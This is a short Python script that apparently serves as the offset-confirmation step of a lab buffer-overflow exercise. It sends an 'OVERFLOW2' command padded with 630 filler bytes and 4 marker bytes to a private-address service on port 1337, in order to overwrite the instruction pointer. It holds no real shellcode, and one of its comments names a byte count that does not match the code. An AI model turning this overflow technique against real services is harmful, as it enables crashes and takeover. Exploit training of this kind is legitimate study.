#!/usr/bin/python3

import sys, socket
from time import sleep

# 2003 is the number of bytes received by running offset.py

shellcode = 'A' * 630 + 'B' * 4

while True:
    try:
        payload = 'OVERFLOW2 /.:/' + shellcode
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect(('10.10.103.180', 1337))
        s.recv(1024)
        s.send((payload.encode()))
        s.recv(1024)
        s.close()

    except:
        print("Error connecting to server")
        sys.exit()
